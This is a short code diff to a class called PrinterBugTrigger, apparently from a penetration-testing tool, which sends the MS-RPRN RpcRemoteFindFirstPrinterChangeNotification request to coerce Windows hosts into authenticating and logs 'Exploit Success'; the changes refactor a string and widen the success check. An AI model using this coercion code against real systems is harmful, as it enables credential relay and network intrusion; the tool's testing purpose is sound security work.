@@ -829,7 +829,7 @@ class PrinterBugTrigger:
 
         self.context.log.debug("Sending RpcRemoteFindFirstPrinterChangeNotification!")
         try:
-            resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
+            resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
         except Exception as e:
             if str(e).find("Broken pipe") >= 0:
                 # The connection timed-out. Let's try to bring it back next round
@@ -853,7 +853,7 @@ class PrinterBugTrigger:
             request["pBuffer"] = NULL
             dce.request(request)
         except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0:
+            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("RPC_S_SERVER_UNAVAILABLE") >= 0:
                 self.context.log.debug("RpcRemoteFindFirstPrinterChangeNotification Success")
                 self.context.log.highlight(f"Exploit Success, {pipe}\\RpcRemoteFindFirstPrinterChangeNotification")
                 if not always_continue:
